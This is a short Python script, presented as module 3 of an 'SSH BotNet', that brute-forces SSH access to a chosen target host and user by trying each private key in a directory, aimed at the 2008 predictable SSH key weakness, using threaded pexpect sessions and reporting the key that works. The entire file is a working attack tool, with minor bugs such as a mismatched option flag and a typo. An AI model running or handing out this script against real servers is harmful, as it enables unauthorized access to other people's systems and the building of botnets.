#!/usr/bin/python3

"""
A SSH BotNet
Module 3 - The 2008 Predictable SSH Key Bruteforce Script
"""

import os
import pexpect
import optparse
from threading import *

max_connections = 5
connection_lock = BoundedSemaphore(value = max_connections)
Stop            = False
Fails           = 0

def connect( user, host, keyfile, release ):
    global Stop
    global Fails
    
    try:
        perm_denied = "Permission denied"
        ssh_new     = "Are you sure you want to continue"
        conn_close  = "Connection closed by remote host"
        opt         = " -o PasswordAuthentication=no"
        ssh_con     = "ssh "+user+"@"+host+" -i "+keyfile+opt
        
        child = pexpect.spawn(ssh_con)
        ret   = child.expect([pexpect.TIMEOUT,perm_denied,ssh_new,conn_close,'$','#'])
        if( ret == 2 ):
            print("[*] Adding host to ~/.ssh/known_hosts")
            child.sendline('yes')
            connect( user, host, keyfile, False )
        elif( ret == 3 ):
            print("[-] Connection closed by Remote Host")
            Fails += 1
        elif( ret > 3 ):
            print("[+] Success ! KeyFile Found ==> "+str(keyfile))
            Stop = True
    finally:
        if( release ):
            connection_lock.release()

def main():
    parser = optparse.OptionParser(usage = "Usage : ./SSHKeyBrute.py -u <user> -w <wordlist> -H <target>")
    parser.add_option("-H", dest = 'host', type = str, help = "Specify the Target host")
    parser.add_option("-D", dest = 'passDir', type = str, help = "Specify the Wordlist to use")
    parser.add_option("-u", dest = 'user', type = str, help = "Speecify the user to attack")
    options,args = parser.parse_args()
    
    host    = options.host
    passDir = options.passDir
    user    = options.user
    
    if ( user == None or passDir == None or host == None ):
        print(parser.usage())
        exit(0)
    
    for filename in os.listdir(passDir):
        if( Stop ):
            print("[+] Exiting KeyFile Found !")
            exit(0)
        if( Fails > 5 ):
            print("[!] Exiting Too many connections closed by remote host")
            print("[!] Try Adjusting max connections")
            exit(0)
        connection_lock.acquire()
        fullpath = os.path.join(passDir,filename)
        print("[*] Testing KeyFile "+str(fullpath))
        t = Thread(target = connect, args = (user, host, fullpath, True))
        child = t.start()


if( __name__ == '__main__' ):
    main()
